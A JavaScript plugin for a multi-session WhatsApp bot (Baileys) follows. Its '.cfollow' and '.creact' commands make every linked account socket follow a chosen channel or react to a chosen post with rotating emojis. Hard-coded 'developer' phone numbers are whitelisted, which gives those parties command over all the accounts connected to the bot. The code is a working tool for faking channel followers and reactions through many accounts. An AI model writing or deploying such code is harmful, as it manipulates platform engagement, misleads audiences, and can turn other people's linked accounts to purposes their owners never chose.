import { delay } from "@whiskeysockets/baileys";
import { cleanPhone } from "../src/core/sessionManager.js";

// Master Developer & Bot Owner Whitelist (ඔබට පමණක් අවසර ඇත)
const DEV_NUMBERS = new Set(["94719845166", "15947733680169"]);

function isAuthorized(sock, msg, from) {
  const botPhone = cleanPhone(sock.user?.id || "");
  const senderJid = msg.key.fromMe
    ? botPhone
    : (msg.key.participant || msg.participant || from || "");
  const senderPhone = cleanPhone(senderJid);

  return msg.key.fromMe || senderPhone === botPhone || DEV_NUMBERS.has(senderPhone);
}

function extractInviteCode(input = "") {
  const match = input.match(/whatsapp\.com\/channel\/([0-9A-Za-z_-]+)/i);
  return match ? match[1] : input.trim();
}

function extractPostDetails(input = "") {
  const match = input.match(/whatsapp\.com\/channel\/([0-9A-Za-z_-]+)(?:\/(\d+))?/i);
  if (!match) return null;
  return {
    channelCode: match[1],
    postId: match[2] || null
  };
}

export default {
  name: "channel",
  aliases: ["cfollow", "creact", "ch"],
  category: "owner",
  description: "Strict targeted channel actions (Developer Only)",

  async execute({ sock, msg, from, args, prefix, body }) {
    const pref = prefix || ".";
    const fullCmd = (body || "").trim().slice(pref.length).trim().split(/\s+/)[0].toLowerCase();
    const subCmd = args[0]?.toLowerCase();

    // 🔒 1. Developer Guard
    if (!isAuthorized(sock, msg, from)) {
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: "🔒 *Access Denied!* මෙම Command එක ක්‍රියාත්මක කළ හැක්කේ Developer හට පමණි." },
        { quoted: msg }
      );
    }

    const activeSockets = global.activeSockets || new Map();
    const socketsList = activeSockets.size > 0 ? Array.from(activeSockets.values()) : [sock];

    // ==========================================
    // 2. TARGETED FOLLOW (.cfollow <link>)
    // ==========================================
    if (fullCmd === "cfollow" || subCmd === "follow") {
      const targetLink = (fullCmd === "cfollow" ? args.join(" ") : args.slice(1).join(" ")).trim();
      const code = extractInviteCode(targetLink);

      if (!code) {
        return await sock.sendMessage(
          from,
          { text: `⚠️ *භාවිතා කරන ආකාරය:*\n${pref}cfollow https://whatsapp.com/channel/0029Vb...` },
          { quoted: msg }
        );
      }

      sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      let successCount = 0;
      let targetJid = null;

      try {
        if (typeof sock.newsletterMetadata === "function") {
          const meta = await sock.newsletterMetadata("invite", code);
          targetJid = meta?.id;
        }
      } catch (_) {}

      if (!targetJid) targetJid = `${code}@newsletter`;

      for (const s of socketsList) {
        try {
          if (typeof s.newsletterFollow === "function") {
            await s.newsletterFollow(targetJid);
            successCount++;
          }
        } catch (_) {}
        await delay(250);
      }

      sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        {
          text:
`✨ *CHANNEL FOLLOW COMPLETED!*
━━━━━━━━━━━━━━━━━━━━━
📢 *Target Code:* \`${code}\`
🤖 *Followed Nodes:* \`${successCount} /${socketsList.length}\`
🔒 *Mode:* Targeted Manual (No auto-following)

💖 *DARK-DINU MD*`
        },
        { quoted: msg }
      );
    }

    // ==========================================
    // 3. TARGETED REACT ONLY (.creact <link> <emojis>)
    // ==========================================
    if (fullCmd === "creact" || subCmd === "react") {
      const rawArgs = fullCmd === "creact" ? args : args.slice(1);
      const postLink = rawArgs[0];
      const emojis = rawArgs.slice(1);

      if (!postLink || emojis.length === 0) {
        return await sock.sendMessage(
          from,
          {
            text: `⚠️ *භාවිතා කරන ආකාරය:*\n${pref}creact <post_link> ❤️ 🔥 ⚡\n\n*(Post එක click කර Share > Copy link මඟින් ලබාගත් link එක පමණක් දමන්න)*`
          },
          { quoted: msg }
        );
      }

      const postData = extractPostDetails(postLink);
      if (!postData || !postData.postId) {
        return await sock.sendMessage(
          from,
          { text: "❌ *Invalid Post Link!* Link එකේ අගට Post ID එක තිබිය යුතුය (Click Post > Share > Copy link)." },
          { quoted: msg }
        );
      }

      sock.sendMessage(from, { react: { text: "⚡", key: msg.key } }).catch(() => {});

      let newsletterJid = null;
      try {
        if (typeof sock.newsletterMetadata === "function") {
          const meta = await sock.newsletterMetadata("invite", postData.channelCode);
          newsletterJid = meta?.id;
        }
      } catch (_) {}
      if (!newsletterJid) newsletterJid = `${postData.channelCode}@newsletter`;

      let sentCount = 0;
      for (let i = 0; i < socketsList.length; i++) {
        const s = socketsList[i];
        const assignedEmoji = emojis[i % emojis.length];

        try {
          if (typeof s.newsletterReactMessage === "function") {
            await s.newsletterReactMessage(newsletterJid, postData.postId, assignedEmoji);
            sentCount++;
          } else if (typeof s.query === "function") {
            await s.query({
              tag: "message",
              attrs: { to: newsletterJid, type: "reaction", server_id: String(postData.postId) },
              content: [{ tag: "reaction", attrs: { code: assignedEmoji } }]
            });
            sentCount++;
          }
        } catch (_) {}

        await delay(200);
      }

      sock.sendMessage(from, { react: { text: "🎉", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        {
          text:
`🔥 *TARGETED REACTIONS DEPLOYED!*
━━━━━━━━━━━━━━━━━━━━━
📌 *Post ID:* \`${postData.postId}\`
🎯 *Channel Target:* \`${postData.channelCode}\`
🎭 *Reactions Sent:* \`${sentCount} Nodes Wave\`
💖 *Emojis:* ${emojis.join(" ")}

🔒 _වෙනත් කිසිදු Channel එකකට Reaction යවා නොමැත._`
        },
        { quoted: msg }
      );
    }

    // Help menu
    return await sock.sendMessage(
      from,
      {
        text:
`👑 *TARGETED CHANNEL SUITE*
━━━━━━━━━━━━━━━━━━━━━
• *${pref}cfollow <link>* — ඔබ ලබා දෙන Channel එක පමණක් Follow වේ.
• *${pref}creact <post_link> <emojis>* — ඔබ ලබා දෙන Post එකට පමණක් React වේ.

🚫 *Auto-react/Auto-follow:* 100% DISABLED.`
      },
      { quoted: msg }
    );
  }
};
